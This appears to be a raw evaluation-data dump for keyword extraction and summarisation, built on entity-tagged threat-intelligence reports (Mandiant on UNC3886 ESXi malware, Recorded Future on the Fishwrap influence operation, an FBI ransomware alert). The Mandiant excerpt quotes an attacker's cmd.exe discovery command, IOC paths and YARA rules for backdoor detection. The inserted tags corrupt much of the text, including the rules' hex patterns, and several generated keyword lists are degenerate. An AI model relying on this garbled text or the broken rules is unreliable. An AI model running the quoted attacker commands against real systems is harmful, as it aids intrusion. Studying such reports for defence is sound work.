[CARDINAL] 9 , the attacker sent the output of a dir listing to a .tmp file . Since the attacker used the Linux syntax ( [CARDINAL] 2 > null ) to suppress errors instead of the [PRODUCT] Windows syntax ( [QUANTITY] 2 > nul ) , all errors were forwarded to the file null in the working directory [ORG] C:\\Windows\\System32\\null . This file was only created if a file enumerated with the dir command had a directory path too long to be displayed . Figure [CARDINAL] 9 : Failed writing Error to Null in Windows CommandC:\\Windows\\system32\\cmd.exe \" /c dir /od /s /a s:\\ > C:\\Windows\\Temp\\TS_<REDACTED>.tmp 2 > null [ORG] AttributionMandiant has begun tracking this activity as [ORG] UNC3886 . Given the highly targeted and evasive nature of this intrusion , we suspect [ORG] UNC3886 motivation to be cyber espionage related . Additionally , we assess with low confidence that [ORG] UNC3886 has a [GPE] China - nexus . Each investigation conducted by [ORG] Mandiant includes analysts from our [ORG] Advanced [ORG] Practices team who work to correlate activity observed in the [CARDINAL] thousands of investigations to which [ORG] Mandiant responds . At times , we do not have the data available to directly attribute intrusion activity to a previously known group . In these cases , we create a new [ORG] UNC group to track the activity that we observed . An [ORG] UNC group is a cluster of related cyber intrusion activity , which includes observable artifacts such as adversary infrastructure , tools , and tradecraft , that we are not yet ready to give a classification such as [ORG] APT or [ORG] FIN . For more details on how [ORG] Mandiant uses [ORG] UNC groups , see our blog post : DebUNCing Attribution : How Mandiant Tracks Uncategorized Threat Actors . ConclusionWhile we noted the technique used by [ORG] UNC3886 requires a deeper level of understanding of the ESXi operating system and [ORG] VMWare \u2019s virtualization platform , we anticipate a variety of other threat actors will use the information outlined in this research to begin building out similar capabilities . Mandiant recommends organizations using7/13ESXi and the [ORG] VMware infrastructure suite follow the hardening steps outlined in this blog post to minimize the attack surface of ESXi hosts . MITRE ATT&CK Techniques CollectionT1560 : Archive Collected Data T1560.001 : Archive via UtilityExecutionT1059 : Command and Scripting Interpreter T1059.001 : [ORG] PowerShell T1059.003 : [ORG] Windows [ORG] Command [ORG] Shell T1059.004 : Unix Shell T1059.006 : Python T1129 : Shared ModulesCommand and ControlT1105 : [ORG] Ingress [ORG] Tool [ORG] Transfer T1573.001 : Symmetric CryptographyDefense EvasionT1027 : Obfuscated Files or Information T1070 : Indicator Removal on Host T1070.003 : Clear Command History T1070.004 : File Deletion T1140 : Deobfuscate / Decode [ORG] Files [ORG] or Information T1202 : [ORG] Indirect [ORG] Command [ORG] Execution [ORG] T1218.011 : [ORG] Rundll32 [ORG] T1497 : Virtualization / Sandbox [ORG] Evasion T1497.001 : System Checks T1620 : Reflective Code LoadingDiscoveryT1016 : System Network Configuration Discovery T1083 : File and Directory DiscoveryLateral MovementT1021 : Remote Services T1021.004 : SSHCredential AccessT1003 : OS Credential Dumping T1003.001 : LSASS Memory8/13PersistenceT1547 : Boot or [PERSON] Logon [PERSON] Autostart [PERSON] ExecutionIndicators of [ORG] CompromiseType .vgz [ORG] PayloadMalicious [ORG] VIB [ORG] Name Filename lsu_lsi_.v05Fullpath / etc / rc.local.d / vmware_local.sh / bin / rdt /bin / vmsyslog.pyFullpath Filename payload1.v00ata - pata - pdc20211Fullpath / etc / rc.local.d / vmware_rhttpio.shFullpath Fullpath / usr / lib / vmware / weasel / consoleui / rhttpproxy - io /usr / libexec / setconf / ksmd / usr / bin / ksmdFullpath Fullpath C:\\Windows\\Temp\\avp.exeFullpath and Hash ( MD5)C:\\Windows\\Temp\\Silverlight\\wmpd.exe VIRTUALPITAVIB NameVIB .vgz child processrule M_APT_VIRTUALPITA_1 description = \" [PERSON] Finds opcodes to set a port to bind on [DATE] 2233 , encompassing the strings : $ x = { 8b ? ? ? ? [CARDINAL] 4 ? b8 [CARDINAL] 04 00 00 00 [ 0 - 4 ] ba [DATE] 02 [DATE] 00 [DATE] 00 00 be [DATE] 01 [DATE] 00 [DATE] 00 [DATE] 00 [ [CARDINAL] 0 - 2 ] e8 ? ? ? ? ? ? ? ? [CARDINAL] 89 [CARDINAL] 4 ? ? ? 83 7 ? ? ? 00 [CARDINAL] 79 [ [CARDINAL] 0 [CARDINAL] - [CARDINAL] 50 ] ba [DATE] 10 [DATE] 00 [DATE] 00 [DATE] 00 [ [CARDINAL] 0 [CARDINAL] - [CARDINAL] 10 ] e8 } condition : uint32(0 ) = = 0x464c457f and all of them description = \" [PERSON] Finds opcodes to decode and parse the recieved data in the socket strings : $ x = { [CARDINAL] 85 c0 74 ? ? c7 05 ? ? ? ? ? ? ? ? fb ff ff ff c7 8 ? ? ? ? ? ? ? ? ? 00 00 00 00 e9 ? ? ? ? ? ? ? ? [CARDINAL] 4 ? 8b 05 ? ? ? ? ? ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [DATE] 01 [DATE] 4 ? 89 05 ? ? ? ? ? ? ? ? c7 4 ? ? ? 00 00 00 00 e9 ? ? ? ? ? ? ? ? 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 98 [CARDINAL] 4 ? 8d 9 ? ? ? ? ? ? ? ? ? [CARDINAL] 4 ? 8d ? ? e0 4 ? [CARDINAL] 8b 0 ? [CARDINAL] 4 ? [CARDINAL] 89 0 ? [CARDINAL] 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 89 [CARDINAL] 4 ? ? ? 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 98 [CARDINAL] 4 ? 8d b ? ? ? ? ? ? ? ? ? b ? ? ? ? ? ? ? ? ? e8 ? ? ? ? ? ? ? ? c7 4 ? ? ? 00 00 00 00 eb ? ? 8b 4 ? ? ? 8b 4 ? ? ? [CARDINAL] 01 c1 [CARDINAL] 8b 4 ? ? ? [CARDINAL] 03 [CARDINAL] 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 98 [CARDINAL] 0f b6 9 ? ? ? ? ? ? ? ? ? 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 98 [CARDINAL] 0f b6 [CARDINAL] 8 ? ? ? ? ? ? ? ? ? [CARDINAL] 31 c2 4 ? [CARDINAL] 63 c1 [DATE] 88 [DATE] 9 ? ? ? ? ? ? ? ? ? [CARDINAL] 83 [CARDINAL] 4 ? ? ? [CARDINAL] 01 } condition : uint32(0 ) = = 0x464c457f and all of them description = \" [PERSON] Finds opcodes from 409dd8 to [CARDINAL] 409e46 in putenv ( ) after loading each character individually . \" strings : $ x = { [CARDINAL] 4 ? 8b 4 ? ? ? c6 00 48 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [CARDINAL] 05 c6 00 49 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 01 c6 00 49 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [CARDINAL] 06 c6 00 4c [CARDINAL] 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 02 c6 00 53 4 ? 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 07 c6 00 45 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [CARDINAL] 03 c6 00 54 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [CARDINAL] 08 c6 00 3d 4 ? 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [CARDINAL] 04 c6 00 46 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [CARDINAL] 09 c6 00 00 4 ? [CARDINAL] 8b 7 ? ? ? e8 } condition : uint32(0 ) = = 0x464c457f and all of them description = \" [PERSON] Finds opcodes from [CARDINAL] 401f1c to [CARDINAL] 401f4f in strings : $ x = { [CARDINAL] 4 ? 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c1 [DATE] 30 [DATE] 4 ? [CARDINAL] 8b 4 ? ? ? [CARDINAL] 4 ? 8b [CARDINAL] 10 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 98 [CARDINAL] 4 ? 8b 04 ? ? ? ? ? ? ? ? ? ? [CARDINAL] 4 ? [CARDINAL] 31 c2 4 ? 8b 4 ? ? ? [CARDINAL] 4 ? [CARDINAL] 83 c0 [DATE] 28 [DATE] 4 ? 8b [CARDINAL] 00 [CARDINAL] 4 ? c1 e8 10 0f b6 c0 [CARDINAL] 4 ? [CARDINAL] 98 [CARDINAL] 4 ? 8b [CARDINAL] 04 } condition:11/13uint32(0 ) = = 0x464c457f and all of them description = \" [PERSON] Finds scripts that launch and then delete files , indicative of cleaning up tracks and remaining in - memory only . \" strings : $ ss = /setsid[^\\n\\r]{,250}-i[\\r\\n]{,5}rm/ condition : all of them description = \" [PERSON] Finds strings indicative of the vmsyslog.py python backdoor . \" strings : $ key1 = \" readInt8 ( ) \" ascii wide $ key2 = \" upload \" ascii wide $ [MONEY] key3 = \" download \" ascii wide $ key4 = \" shell \" ascii wide $ key5 = \" execute \" ascii wide $ re1 = /def\\srun.{,20}command\\s?=\\s?self\\.conn\\.readInt8\\(\\).{,75}upload . { , [CARDINAL] 75}download.{,75}shell.{,75}execute / s condition : filesize < [CARDINAL] 200 [PERSON] KB and all of them } [ORG] AcknowledgementsSpecial thanks to [PERSON] Brad [PERSON] Slaybaugh , [PERSON] Joshua [PERSON] Kim , [PERSON] Zachary [PERSON] Smith , [PERSON] Kirstie [PERSON] Failey , [PERSON] Nick [PERSON] Simonian , and [PERSON] Charles [PERSON] Carmakal for their assistance with the investigation , technical review , and creating detections for the malware families discussed in this blog post . In addition , we would also like to thank [ORG] VMware for their collaboration on this research.12/1313/13", "generated_text": "Mandiant; a novel malware ecosystem; VMware ESXi; Linux vCenter servers; Windows virtual machines; a threat actor; malicious vSphere Installation Bundles; VIRTUALPITA; VIRTUALPIE; a persistence mechanism; access; the ESXi hypervisor; a host acceptance level; the malware; a payload; a.vgz archive; directories; files; the ESXi machine; the payload; files; the ESXi machine; the VIB; the payload; arbitrary commands; arbitrary operations; arbitrary privileges; attacker commands; arbitrary boot paths; the ESXi hypervisor; The signature file; the malware; a command; a Windows virtual machine; the ESXi hypervisor; this new malware community; a long-term solution; at least a year; the ESXi environment; a zero-day vulnerability; a threat actor.", "ref_text": "<START-1>The PDF document from Mandiant details the investigation of novel malware being deployed on VMware ESXi hypervisors by a threat actor tracked as UNC3886. The malware ecosystem enables persistent administrative access to the hypervisor, command execution on guest VMs, file transfers between the hypervisor and VMs, tampering with logs, and executing commands between VMs on the same hypervisor. The malware was initially detected when commands were seen coming from the vmtoolsd process on a Windows VM hosted on an ESXi hypervisor. Analysis of the ESXi boot profiles revealed malicious VIBs (vSphere Installation Bundles) being used to deploy backdoors called VIRTUALPITA and VIRTUALPIE on the hypervisors after reboot. The VIBs were signed as PartnerSupported though they were actually CommunitySupported, allowing installation with the --force flag. VIRTUALPITA creates a listener on the hypervisor for arbitrary command execution, file transfers, and starting/stopping logging. VIRTUALPIE is a Python backdoor with similar capabilities. Commands executed on the hypervisor are sent to guest VMs via vmtoolsd.exe for execution. This was used for file enumeration, compression, and credential dumping. VARIUALPITA samples were also found on Linux vCenter systems masquerading as a legitimate process. Windows VMs hosted on the compromised hypervisors contained VIRTUALGATE, a utility that uses VMCI sockets to run commands on guest VMs from the hypervisor. Based on the nature of the intrusions, Mandiant assesses UNC3886 has a likely China nexus and espionage motivations. Indicators of compromise, Yara rules, and recommendations for hardening ESXi/vSphere environments are provided. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4724770642201836, "gpt3/lexical/rouge_rouge2": 0.15207373271889402, "gpt3/lexical/rouge_rougeL": 0.2477064220183486, "gpt3/lexical/rouge_rougeLsum": 0.2477064220183486, "gpt3_generated_text": ["The article discusses a novel malware ecosystem that has been identified by Mandiant, impacting VMware ESXi, Linux vCenter servers, and Windows virtual machines. This malware enables a threat actor to maintain persistent administrative access to the hypervisor, send commands to the hypervisor, transfer files between the hypervisor and guest machines, tamper with logging services, and execute arbitrary commands. The malware is installed through malicious vSphere Installation Bundles (VIBs), which are collections of files used for software distribution and system management. The VIBs serve as a persistence mechanism for the attacker to maintain access across ESXi hypervisors. The article also explains the components of a VIB, including an XML descriptor file, a VIB payload, and a signature file. The acceptance level of a VIB is used to verify its authenticity and can be changed manually by an ESXi administrative account. The article emphasizes the importance of detecting and removing malicious or anomalous VIBs from the ESXi environment to protect against this new malware community. It also states that there is no evidence of a zero-day vulnerability being used to gain initial access or deploy the malicious VIBs at the time of writing."]}, {"split_name": "val", "sample_id": "val_35", "prompt_text": "Extract the keywords: For [DATE] several [DATE] years , [ORG] Recorded [ORG] Future has been developing tools and methodologies for detecting and analyzing influence operations by nation - states and others . We have recently upgraded some of these tools and applied them to detecting a new kind of influence operation , which recycles old news about terror incidents by publishing them to appear as new . We refer to this technique as \u201c [PERSON] Fishwrap . \u201d This operation is also using a special family of URL shorteners that allow attackers to track click - through from social media posts used in their campaigns . Key Findings\u2022 We have developed new algorithms for identifying influence operations . These algorithms allow for the detection of \u201c seed accounts , \u201d which can be used to analyze additional accounts engaged in an operation.\u2022 Behavioral analytics based on topological methodologies can be used to analyze the highest - likelihood participants in an operation and cluster those with the highest degree of similarity.\u2022 Using this methodology , we identified a new kind of influenceoperation : [PERSON] Fishwrap . This methodology uses old terror news masquerading as new.\u2022 Over 215 social media accounts participating in the Fishwrapoperation were analyzed.\u2022 These social media accounts use a special family of [CARDINAL] at [CARDINAL] least [CARDINAL] 10 different URL shortener services that allow for tracking the effectiveness of the operation . All of these URL services are running the same code and are hosted on the same commercial infrastructure.\u2022 The accounts \u2019 behavioral similarity leads us to believe thatthey are all part of the same influence operation.\u2022 Since account holders are most likely fictive and thedomains used for the URL shortener services are registered anonymously , attribution is difficult \u2014 however , research is ongoing . Recorded Future | www.recordedfuture.com | CTA-2019 - 0612 | 1Influence [ORG] OperationsRAND [ORG] Corporation defines information operations and warfare , also known as influence operations , as the collection of tactical information about an adversary , as well as the dissemination of propaganda in pursuit of a competitive advantage over an opponent . [ORG] Recorded [ORG] Future and its partners have been engaged in identifying and characterizing influence operations for [DATE] more [DATE] than [DATE] five [DATE] years , with studies including how terror supporters spread propaganda , election hacking in the [GPE] U.S. in [DATE] 2016 and [DATE] 2018 , and how [GPE] China uses social media to influence [GPE] U.S. opinion . Influence operations are , of course , not an exclusive nation - state activity \u2014 political groups use the same mechanisms , as do criminals engaging in stock manipulation activities . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - [CARDINAL] 0612 | [CARDINAL] 2The Anatomy of an [ORG] Influence [ORG] OperationInfluence operations that aim to change public opinion ( for example , trying to sway the outcome of an election ) need to reach a large number of people with messages that resonate with their beliefs or fears . Previously , certain groups , including the [NORP] Nazis in [DATE] the [DATE] 1930s all the way to the [NORP] Hutus in [DATE] the [DATE] 1990s , used radio to obtain massive reach . [DATE] Today , social media has become the channel of choice for influence operations . Using data - driven profiling , messages can be personalized , as highlighted by the [GPE] Cambridge Analytica scandal . Even though \u201c fake news \u201d has become highly associated with influence operations , in many cases , \u201c real news \u201d is also used , but it \u2019s carefully selected to emphasize the opinions the operation wishes to foment . These news pieces can be distributed in different ways , such as through paid advertising ( as in the [GPE] Cambridge [PERSON] Analytica case ) , by using a large number of social media accounts that are controlled by humans ( so - called \u201c trolls \u201d ) , or with algorithms . Advertising campaigns are hard to detect without access to users \u2019 news feeds , but campaigns using ordinary social media posts by a large number of accounts will be possible to detect by using a solution such as [ORG] Recorded [ORG] Future . Detecting and Tracking Influence OperationsTo detect an influence operation , we need a starting point \u2014 a seed . This can be a particular story that is used by the operation engaging in it . Once [CARDINAL] one or more seeds have been selected , we can broaden the scope of our investigation by finding related topics , such as URLs , hashtags , and user accounts . The image below illustrates how our Snowball algorithm can be used to grow the number of potential accounts engaged in an operation , starting with either a few accounts or with some topics believed to be used by an operation . Recorded Future | www.recordedfuture.com | CTA-2019 - [CARDINAL] 0612 | 3The Snowball algorithm generates a large number of candidate accounts , but will also typically find many false positives since \u201c innocent \u201d accounts will repost news from the operation . To decide which accounts are really part of the operation , we can use behavioral analytics to characterize and cluster the activities implicated by the [FAC] Snowball algorithm . Our approach to analytics is to define a number of similarity metrics over a large set of social media accounts . For example , accounts are more similar if they:\u2022 Post the same URLs and hashtags \u2014 the similarity is stronger if only a few accounts post a certain URL or hashtag within a certain time frame\u2022 Post on the same topics , as defined by the entities and eventsthey mention\u2022 Are using the same URL shorteners\u2022 Have similar temporal behavior \u2014 either their overall periodof activity or their [DATE] weekly or [DATE] daily behavioral [ORG] patterns\u2022 Have mutually exclusive but adjacent overall periods ofactivity \u2014 this is a weak but not insignificant indication that [CARDINAL] one account has replaced the other\u2022 Have similar account names , as defined by the editingdistance between their namesRecorded Future | www.recordedfuture.com | CTA-2019 - 0612 | [CARDINAL] 4All of these different similarity metrics can be used to cluster accounts . We then look at sets of accounts which are associated with multiple identical similarity clusters . These accounts are highly likely to be part of the same influence operation . Accounts which are related only through joint membership in [CARDINAL] one cluster are not very likely to be part of the operation \u2014 they are just associated ( for example , by having reposted a post originated by the operation).Fake News in Influence Operations : [CARDINAL] 2 ExamplesIdentifying fake or biased news can be hard , but by looking at some examples , we can gain some insight . For example , in a timeline view of reports on protests in [GPE] Sweden in [DATE] 2018 , [CARDINAL] one event on [DATE] July [DATE] 16 , [DATE] 2018 regarding [NORP] Muslims protesting against crosses stands out because it is only being reported in [LANGUAGE] Russian . This is quite strange for what should be major news in [GPE] Sweden , and different from all other major protests during the period . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0612 | 5Even though we [ORDINAL] first found this \u201c news \u201d in [LANGUAGE] Russian , it was also referenced by other social media accounts ( like [GPE] U.S. alt - right ones).This particular story turns out to be entirely fake , and in this case , we could actually use a reverse image search to find the original story , which turns out to be about students protesting in [GPE] Chile [DATE] two [DATE] years [DATE] earlier . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0612 | [CARDINAL] 6This example validates our intuition that important news stories which are reported either only in a single language , in a surprisingly small volume , or only on social media , are good initial candidates for being fake or hyperpartisan news used in an influence operation . As another example , we compared the actual source distribution of a real terror event that took place on [DATE] November [DATE] 13 , [DATE] 2015 in [GPE] Paris ( [CARDINAL] 177 [CARDINAL] thousand references , mostly in mainstream media ) with fake news about an event in [GPE] Paris on [DATE] March 23 , [DATE] 2019 ( only 19 references , mostly on social media ) . The account similarity associated with being one of the few accounts posting on [DATE] March 23 , [DATE] 2019 is much higher than that associated with being [CARDINAL] one of [CARDINAL] thousands of accounts posting on [DATE] November [DATE] 13 , [CARDINAL] 2015.Recorded Future | www.recordedfuture.com | CTA-2019 - 0612 | [CARDINAL] 7Fishwrap : A New Influence [ORG] OperationThe fake [GPE] Paris terror event mentioned above is actually part of an influence operation that we have detected using our new algorithms . This operation is focused on posting old terror news stories as if they were new , probably with the goal of spreading general fear and uncertainty . We call this operation [PERSON] Fishwrap , since it uses old news for other purposes . We [ORDINAL] first detected [PERSON] Fishwrap through our automatic tracking of terror events only reported by social media , like the [GPE] Paris example above . Below is another example of such event reporting . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - [CARDINAL] 0612 | [CARDINAL] 8By tracking terror events in [ORG] Recorded [ORG] Future that were only reported on social media , we were able to find a set of [CARDINAL] about [CARDINAL] a [CARDINAL] dozen accounts clearly engaged in spreading old terror news as if it were new . The reason we compared the specific dates in the [GPE] Paris terror example above is because of a social media post from [DATE] March 23 , [DATE] 2019 reporting on an event shown in the image below . However , the URL - shortened link in the post led us to an article about the original event from [DATE] November [DATE] 13 , [DATE] 2015 . While many readers would probably not scrutinize the publication dates , it is easy to see how the post could cause concern for those reading it and prompt them to follow the link to validate the news , missing the difference in publication date . By applying the [FAC] Snowball algorithm to the small set of identified posts , we could swiftly grow the number of suspicious activities in this operation to [CARDINAL] more [CARDINAL] than [CARDINAL] a [CARDINAL] thousand profiles . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0612 | 9Narrowing It DownWe then looked at the similarities within this fairly large set of accounts and concentrated on [CARDINAL] three specific aspects:1 . Temporal behavior2 . The domain of the URLs referred to in the accounts \u2019 posts3 . Account statusTemporal BehaviorBy plotting the activity ( postings ) of all accounts found in the operation , we can identify different activity periods . We clearly see [CARDINAL] three different clusters of accounts:1 . Those active [DATE] between [DATE] May [DATE] 2018 [DATE] to [DATE] October [DATE] 20182 . Those active [DATE] between [DATE] November [DATE] 2018 [DATE] to [DATE] April [DATE] 20193 . Those active during the entire time period , between [DATE] May [DATE] 2018to [DATE] April 2019Recorded Future | www.recordedfuture.com | CTA-2019 - 0612 | 10These temporal patterns indicate the launch of a number of accounts in [DATE] May [DATE] 2018 , many of which were shut down in [DATE] October [DATE] 2018 . These were followed [DATE] a [DATE] few [DATE] weeks [DATE] later by a new batch of accounts with the same behavior and still in operation . Topic Similarity : URLs and [ORG] Domains UsedBy looking at the URLs posted by a subset of the accounts , it is clear that there is some relationship between them since they , to some extent , post identical URLs . The graph above looks quite complicated . However , if we focus only on the domains of these URLs , a much simpler picture emerges , shown below . Recorded Future | www.recordedfuture.com | CTA-2019 - 0612 | 11It turns out that a lot of the accounts are posting all of their links through a small number of URL shortener services ( in the example above , pucellina[.]com and bioecologyz[.]com ) . More precisely , we can identify [CARDINAL] 10 domains hosting URL shortener services that are used for essentially every single post made by [CARDINAL] 215 of the identified accounts . As seen in the graph above , some accounts use multiple URL shorteners , and thus show that there is an indirect connection between accounts using different shorteners . Overall , we can see that each domain has a fairly large number of accounts that has published some reference to it , and a very small number of accounts have published a reference to [CARDINAL] more [CARDINAL] than [CARDINAL] one of the domains ( based on the data we \u2019ve collected ) . The exception is the [CARDINAL] two domains pucellina[.]com and bioecologyz[.]com , where a larger number of accounts have published references to both domains . Recorded Future | www.recordedfuture.com | CTA-2019 - 0612 | [CARDINAL] 12It gets more interesting ! Upon inspecting the [CARDINAL] 10 different URL shortener websites , we immediately see that their appearance is identical . This is strong evidence linking all [CARDINAL] 215 accounts to [QUANTITY] 10 [QUANTITY] URL shorteners , which in turn appear to be running the same code . Interestingly , an inspection of the HTML code for the URL shorteners also reveals that these domains seem to be tracking all agents that follow the links . This could be to measure the effectiveness of the operation , but it might also be used for profiling the \u201c captured audience \u201d of the operation . Unfortunately , all of these [CARDINAL] 10 domains are anonymously registered , and we can not see who registered or owns them . We did investigate where these services are hosted , and it turns out they are all f89.meadminsky.cn xincache.com 22.cn22.cn24,156 11,232We can clearly see [CARDINAL] two clusters of domains corresponding to the [CARDINAL] two time frames we identified in the temporal analysis above . The [ORDINAL] first [CARDINAL] eight domains were created just prior to the observed start of the campaign ( the red accounts in the temporal analysis above ) , and the last [CARDINAL] two domains were created [DATE] some [DATE] weeks before the launch of the [ORDINAL] second wave of the campaign ( the orange accounts in the temporal analysis above).We can also see historic name servers for a couple of domains , but this does not give us much additional information . None of the [CARDINAL] 10 domains have any risk score in [ORG] Recorded [ORG] Future \u2014 the only trace of malicious activity is that one of the previous name servers has been associated with a suspicious [ORG] IP number and a malware command and control server . Recorded Future | www.recordedfuture.com | CTA-2019 - 0612 | 14Sadly , due to anonymous registration , this is where our trail ends ! We can only speculate as to who registered these domains and is running the network of social media accounts that use them . The fact that the operation has been going on for [DATE] close [DATE] to [DATE] a [DATE] year , and that it is spending money on numerous domains on dedicated servers , leads us to believe this is not just someone running the operation \u201c for the lulz , \u201d but rather , a political organization or nation - state with an intent to spread fear and uncertainty and track followers of the posted links . [PERSON] Account [PERSON] StatusUpon closer inspection of the status of the accounts , we note that a fair percentage of them have been suspended . The degree of suspension varies between different URL shortener service clusters , but it is clear that there has been no general suspension of accounts related to these URL shorteners . We believe [CARDINAL] one reason for this is that by posting links related to old , but real , terror events , the accounts are not in clear violation of any terms of service , and therefore have not been suspended due to either automatic identification or manual reporting . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0612 | 15ConclusionBased on a long track record of investigating influence operations , we developed a set of algorithms for identifying and analyzing such operations . Using these algorithms , we have identified a fairly large influence operation that uses old terror events repackaged as breaking news to gain attention . Using behavioral analytics , we have shown how [CARDINAL] more [CARDINAL] than [CARDINAL] 215 accounts have participated in or are participating in this operation . The operation uses a set of dedicated URL shortener services to link to old news , and this mechanism allows the operation to track the efficiency of its operation and possibly to analyze what kind of audience ( at least geographically ) it succeeds in targeting . About Recorded FutureRecorded Future arms security teams with the only complete threat intelligence solution powered by patented machine learning to lower risk . Our technology automatically collects and analyzes information from an unrivaled breadth of sources and provides invaluable context in real time and packaged for human analysis or integration with security technologies . [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0612 | [CARDINAL] 16", "generated_text": "Recorded Future; an influence operation; old terror news; Fishwrap; the operation; over 215 social media accounts; a special family; URL shorteners; social media posts; their campaigns; the attacks; similarities; the accounts; the highest likelihood; the operation; attribution; the highest-likely participants; account holders; the accounts; behavioral analysis; topological methodologies; analysis; the highest- likelihood; participants; the highest degree; similarity; the accounts; the same influence operation; the accounts; the same code; the same commercial infrastructure; The accounts; behavioral similarity; the highest degree; the same influence operation; the highest likelihood; the highest degree; the same influence operation; research; attribution; the highest- likelihood; the accounts; the highest degree; similarity.", "ref_text": "<START-1>The cybersecurity firm Recorded Future has developed new algorithms to identify and analyze influence operations on social media. Using these methods, they discovered a coordinated influence campaign called \"Fishwrap\" that spreads old terror news stories as if they were new, likely to provoke fear and uncertainty. Recorded Future identified over 200 social media accounts participating in Fishwrap. The accounts exhibit similarities in timing of activity, topics posted, use of specific URL shortening services, and account suspension rates. This leads Recorded Future to believe the accounts are part of the same influence operation. The influence operation uses a network of 10 URL shortening services that appear identical in design and are hosted on the same infrastructure. The URLs allow the operators to track those who click through, possibly to analyze the effectiveness and target audience. The domains are anonymously registered, making attribution difficult. Given the significant time and infrastructure investment, Recorded Future speculates this is an influence operation by a political entity or nation-state rather than individuals. The goal seems to be spreading fear by repackaging old terror stories as new news. While not outright fake news, the stories are presented deceptively via the network of social media accounts. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5307125307125308, "gpt3/lexical/rouge_rouge2": 0.1382716049382716, "gpt3/lexical/rouge_rougeL": 0.2506142506142506, "gpt3/lexical/rouge_rougeLsum": 0.2506142506142506, "gpt3_generated_text": ["Recorded Future has developed tools and methodologies to detect and analyze influence operations, including a new type of operation called \"Fishwrap.\" Fishwrap involves the recycling of old terror news to make it appear new. The operation utilizes over 215 social media accounts that use a special family of URL shorteners to track the effectiveness of their campaigns. Behavioral analytics and topological methodologies are used to identify the highest-likelihood participants in the operation and cluster those with the highest degree of similarity. However, attribution is difficult due to fictive account holders and anonymously registered domains. Influence operations are not exclusive to nation-states and can also be carried out by political groups and criminals. Social media has become the preferred channel for influence operations, allowing for personalized messages and the distribution of carefully selected news pieces. To detect and track influence operations, a seed story is used as a starting point, and related topics, URLs, hashtags, and user accounts are investigated. The Snowball algorithm is used to generate potential accounts involved in the operation, and behavioral analytics are used to determine which accounts are truly part of the operation. The article emphasizes the importance of detecting and monitoring influence operations in order to protect against manipulation and propaganda."]}, {"split_name": "val", "sample_id": "val_36", "prompt_text": "Extract the keywords: TLP : WHITE28 Oct [CARDINAL] 2021FLASH NumberCU-000154 - MWThe following information is being provided by the [ORG] FBI , with no guarantees or warranties , for potential use at the sole discretion of recipients to protect against cyber threats . This data is provided in order to help cyber security professionals and system administrators to guard against the persistent malicious actions of cyber actors . This FLASH was coordinated with DHS / CISA . This FLASH has been released [ select appropriate TLP level and remove others ] TLP : WHITEWE NEED YOUR HELP ! If you identify any suspicious activity within your enterprise or have related information , please contact the [ORG] FBI immediately with respect to the procedures outlined in [ORG] the [ORG] Reporting [ORG] Notice sectionof this message . [ORG] Tactics , Techniques , and Indicators of Compromise Associated with [ORG] Hello [ORG] Kitty / [ORG] FiveHands RansomwareSummary The [ORG] FBI first observed [ORG] Hello [ORG] Kitty / [ORG] FiveHands ransomware in [DATE] January [DATE] 2021 . Hello [PERSON] Kitty / FiveHands actors aggressively apply pressure to victims typically using the double extortion technique . In some cases , if the victim does not respond quickly or does not pay the ransom , the threat actors will launch [ORG] a [ORG] Distributed [ORG] Denial [ORG] of [ORG] Service ( DDoS ) attack on the victim company \u2019s public facing website . Hello [PERSON] Kitty / FiveHands actors demand varying ransom payments in Bitcoin ( BTC ) that appear tailored to each victim , commensurate with their assessed ability to pay it . If no ransom is paid , the threat actors will post victim data to the [NORP] Babuk site ( payload.bin ) or sell it to a [ORDINAL] third - party data broker . TLP : WHITETLP : WHITE /Technical Details Hello Kitty / FiveHands ransomware uses compromised credentials or known vulnerabilities in [ORG] SonicWall products ( CVE-2021 - 20016 , CVE-2021 - 20021 , CVE-2021- [DATE] 20022 , CVE-2021 - 20023 ) . Once inside the network , the threat actor will use publicly available penetration tool suites such as [PERSON] Cobalt [PERSON] Strike , Mandiant \u2019s [ORG] Commando , or [ORG] PowerShell [ORG] Empire preloaded with publicly available tools like [GPE] Bloodhound and [PERSON] Mimikatz to map the network and escalate privileges before exfiltration and encryption . Indicators The following indicators were leveraged by threat actors during [ORG] Hello [ORG] Kitty / [ORG] FiveHands ransomware compromises : SHA-256 a0281437a7efTLP : WHITEPAExec.exemy15.ps1 ( [ORG] Warprism)grabff.exegrbachrome.exespoolsv.exe9e63911b5b7e63023708125418d6d [ORG] e52c08fa149SombRAT \u2013 SHA- 256 4de9dc28733dd22dabba678TLP : WHITETLP : WHITE /Information Requested The [ORG] FBI does not encourage paying a ransom to criminal actors . Paying a ransom may embolden adversaries to target additional organizations , encourage other criminal actors to engage in the distribution of ransomware , or fund 